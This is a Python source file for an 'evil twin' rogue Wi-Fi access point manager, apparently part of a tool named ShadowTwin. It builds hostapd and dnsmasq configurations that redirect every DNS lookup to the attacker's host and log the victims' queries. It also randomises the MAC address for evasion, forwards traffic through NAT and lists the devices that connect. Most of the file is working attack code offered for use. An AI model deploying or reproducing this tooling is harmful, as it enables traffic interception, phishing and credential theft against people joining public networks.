#!/usr/bin/env python3
"""
Advanced HostAPD Manager for Evil Twin Access Points
Handles multiple AP configurations and management
"""

import os
import subprocess
import time
import threading
import yaml
from colorama import Fore, Style
import tempfile
import signal
import atexit

class AdvancedAPManager:
    def __init__(self, interface, ssid="Free_WiFi", channel=6, hidden=False):
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.hidden = hidden
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.is_running = False
        
        # Load configuration
        self.load_config()
        
        # Setup signal handlers for clean shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def load_config(self):
        """Load configuration from YAML file"""
        try:
            with open('config.yaml', 'r') as f:
                self.config = yaml.safe_load(f)
        except FileNotFoundError:
            # Default configuration
            self.config = {
                'network': {
                    'country_code': 'US',
                    'hw_mode': 'g'
                }
            }
    
    def create_hostapd_conf(self):
        """Create hostapd configuration file"""
        conf_content = f"""
# HostAPD configuration for ShadowTwin
interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode={self.config['network'].get('hw_mode', 'g')}
channel={self.channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid={1 if self.hidden else 0}
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
country_code={self.config['network'].get('country_code', 'US')}
"""
        
        # Create temporary config file
        fd, conf_path = tempfile.mkstemp(suffix='.conf', prefix='hostapd_')
        with os.fdopen(fd, 'w') as f:
            f.write(conf_content)
        
        return conf_path
    
    def create_dnsmasq_conf(self):
        """Create dnsmasq configuration file"""
        conf_content = f"""
# DNSMasq configuration for ShadowTwin
interface={self.interface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""
        
        # Create temporary config file
        fd, conf_path = tempfile.mkstemp(suffix='.conf', prefix='dnsmasq_')
        with os.fdopen(fd, 'w') as f:
            f.write(conf_content)
        
        return conf_path
    
    def setup_network(self):
        """Setup network interface and routing"""
        print(f"{Fore.CYAN}[*] Setting up network interface {self.interface}{Style.RESET_ALL}")
        
        commands = [
            # Bring interface down
            ['ifconfig', self.interface, 'down'],
            # Change MAC address (optional evasion)
            ['macchanger', '-r', self.interface],
            # Bring interface up
            ['ifconfig', self.interface, 'up'],
            # Set IP address
            ['ifconfig', self.interface, '10.0.0.1', 'netmask', '255.255.255.0'],
            # Enable IP forwarding
            ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
            # Setup iptables rules
            ['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'],
            ['iptables', '-A', 'FORWARD', '-i', self.interface, '-o', 'eth0', '-j', 'ACCEPT'],
            ['iptables', '-A', 'FORWARD', '-i', 'eth0', '-o', self.interface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'],
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, check=True, capture_output=True)
            except subprocess.CalledProcessError as e:
                print(f"{Fore.YELLOW}[!] Command failed: {' '.join(cmd)} - {e}{Style.RESET_ALL}")
    
    def start_ap(self):
        """Start the access point"""
        print(f"{Fore.CYAN}[*] Starting evil twin access point{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] SSID: {self.ssid}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Channel: {self.channel}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Interface: {self.interface}{Style.RESET_ALL}")
        
        try:
            # Setup network
            self.setup_network()
            
            # Start hostapd
            hostapd_conf = self.create_hostapd_conf()
            self.hostapd_process = subprocess.Popen(
                ['hostapd', hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Start dnsmasq
            dnsmasq_conf = self.create_dnsmasq_conf()
            self.dnsmasq_process = subprocess.Popen(
                ['dnsmasq', '-C', dnsmasq_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            self.is_running = True
            
            # Monitor processes
            self.monitor_thread = threading.Thread(target=self.monitor_processes)
            self.monitor_thread.daemon = True
            self.monitor_thread.start()
            
            print(f"{Fore.GREEN}[+] Evil twin access point started successfully{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to start access point: {e}{Style.RESET_ALL}")
            self.stop_ap()
    
    def stop_ap(self):
        """Stop the access point and cleanup"""
        print(f"{Fore.CYAN}[*] Stopping evil twin access point{Style.RESET_ALL}")
        
        self.is_running = False
        
        # Kill processes
        if self.hostapd_process:
            self.hostapd_process.terminate()
            self.hostapd_process.wait()
        
        if self.dnsmasq_process:
            self.dnsmasq_process.terminate()
            self.dnsmasq_process.wait()
        
        # Cleanup iptables
        try:
            subprocess.run(['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'], 
                         capture_output=True)
            subprocess.run(['iptables', '-D', 'FORWARD', '-i', self.interface, '-o', 'eth0', '-j', 'ACCEPT'], 
                         capture_output=True)
            subprocess.run(['iptables', '-D', 'FORWARD', '-i', 'eth0', '-o', self.interface, '-m', 'state', 
                          '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'], capture_output=True)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Failed to cleanup iptables: {e}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] Evil twin access point stopped{Style.RESET_ALL}")
    
    def monitor_processes(self):
        """Monitor hostapd and dnsmasq processes"""
        while self.is_running:
            if self.hostapd_process and self.hostapd_process.poll() is not None:
                print(f"{Fore.RED}[-] hostapd process died{Style.RESET_ALL}")
                self.is_running = False
                break
            
            if self.dnsmasq_process and self.dnsmasq_process.poll() is not None:
                print(f"{Fore.RED}[-] dnsmasq process died{Style.RESET_ALL}")
                self.is_running = False
                break
            
            time.sleep(1)
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        print(f"\n{Fore.YELLOW}[*] Received shutdown signal{Style.RESET_ALL}")
        self.stop_ap()
    
    def get_connected_clients(self):
        """Get list of connected clients"""
        try:
            # Parse DHCP leases
            result = subprocess.run(['cat', '/var/lib/dhcp/dhcpd.leases'], 
                                  capture_output=True, text=True)
            
            clients = []
            for line in result.stdout.split('\n'):
                if 'lease' in line and '10.0.0.' in line:
                    ip = line.split()[1]
                    clients.append(ip)
            
            return clients
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error getting connected clients: {e}{Style.RESET_ALL}")
            return []
    
    def change_ssid(self, new_ssid):
        """Dynamically change SSID"""
        print(f"{Fore.CYAN}[*] Changing SSID to: {new_ssid}{Style.RESET_ALL}")
        self.ssid = new_ssid
        self.restart_ap()
    
    def change_channel(self, new_channel):
        """Dynamically change channel"""
        print(f"{Fore.CYAN}[*] Changing channel to: {new_channel}{Style.RESET_ALL}")
        self.channel = new_channel
        self.restart_ap()
    
    def restart_ap(self):
        """Restart the access point with new configuration"""
        if self.is_running:
            self.stop_ap()
            time.sleep(2)
            self.start_ap()